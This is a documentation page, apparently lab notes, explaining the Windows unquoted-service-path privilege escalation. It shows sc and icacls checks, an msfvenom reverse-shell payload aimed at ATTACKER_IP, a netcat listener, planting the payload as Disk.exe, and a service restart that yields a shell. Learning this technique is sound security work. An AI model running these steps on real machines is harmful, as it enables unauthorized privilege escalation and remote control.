---
sidebar_position: 3
---

# Unquoted Service Paths


## Overview

**Unquoted:** PATH of the associated Executable isn't properly Quoted to Account for spaces on the Command.

```bash
                       # Quoted #                                                      # Unquoted #
+--------------------------------------------------------+      +------------------------------------------------------+
| "C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe" | -->> | C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |
+--------------------------------------------------------+      +------------------------------------------------------+
```

<br/>

When the `SCM` **(Service Control Manager)** tries to Execute the Binary, a problem arises. Since there are **Spaces** on the Name of the `"Disk Sorter Enterprise"` Folder, the Command becomes **Ambiguous** and `SCM` tries the Following:

##

| Command | Argument [1] | Argument [2] |
| :----- | :----------: | :----------: |
| C:\MyPrograms\Disk.exe  | Sorter | Enterprise\bin\disksrs.exe    |
| C:\MyPrograms\Disk Sorter.exe  | Enterprise\bin\disksrs.exe    |     |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe  |     |     |


<br/>


## Exploitation

- <b style={{ color: 'DeepSkyBlue' }}>Disk Sorter Enerprise</b> Service has <span style={{fontWeight: 'Bold'}}>Unquoted Service Paths.</span>

```bash
C:\> sc qc "Disk Sorter Enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

<br/>

- The <b style={{ color: 'PowderBlue' }}>BUILTIN\\Users:(WD)(AD)</b> has the Ability to <span style={{fontWeight: 'Bold'}}>Append - Write Data.</span>

```log
C:\>icacls c:\MyPrograms
C:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

<br/>

- Generating and Transfering the **PAYLOAD**

```bash
attacker@machine:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc.exe
attacker@machine:~$ nc -lvp 4446
```

<br/>

- Replacing the Service Executable with our **PAYLOAD.**
- We need another User to execute the **PAYLOAD**, so we grant Full Permission to the **Everyone Group:** <b style={{ color: 'PowderBlue' }}>Everyone:(F)</b>

```powershell
C:\> move C:\Users\thm-unpriv\rev-svc.exe C:\MyPrograms\Disk.exe
C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

<br/>

- Starting a `netcat` Listener.
- Restarting the <b style={{ color: 'DeepSkyBlue' }}>Disk Sorter Enerprise</b> Service. 

```log
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

```bash
attacker@machine:~$ nc -lvp 4446
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```